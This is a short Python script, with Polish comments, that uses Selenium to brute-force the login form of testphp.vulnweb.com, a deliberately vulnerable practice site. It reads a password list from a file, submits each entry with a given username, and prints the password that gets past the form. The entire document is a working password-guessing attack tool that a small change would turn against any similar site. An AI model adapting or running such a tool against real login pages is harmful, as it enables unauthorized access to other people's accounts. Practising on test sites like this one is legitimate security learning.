from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support import expected_conditions as EC

driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
driver.get("http://testphp.vulnweb.com/login.php")

"""Obłsuga listy hasłę"""


def read_list_from_file(filename):
    file_handler = open(filename + ".txt", "r")
    read_list = file_handler.readlines()
    file_handler.close()
    return read_list


username = input("Podaj nazwę użytkownik :")  #test
if username != "":
    pass

else:
    print("Nazwa użytkownika nie może być pusta:")

passfile = input("Podaj nazwę pliku haseł :") #passw


"""Osługa strony"""
cssclick = "#content > div:nth-child(1) > form > table > tbody > tr:nth-child(3) > td > input[type=submit]"
paswords = read_list_from_file(passfile)

for password in paswords:
    driver.find_element(by=By.NAME, value="uname").send_keys(username)
    driver.find_element(by=By.NAME, value="pass").send_keys(password)
    driver.find_element(by=By.CSS_SELECTOR, value=cssclick).click()
    try:  # obsługa błedów
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, "uname")))
    except:
        print("Correct password is ==>" + password + " <==")
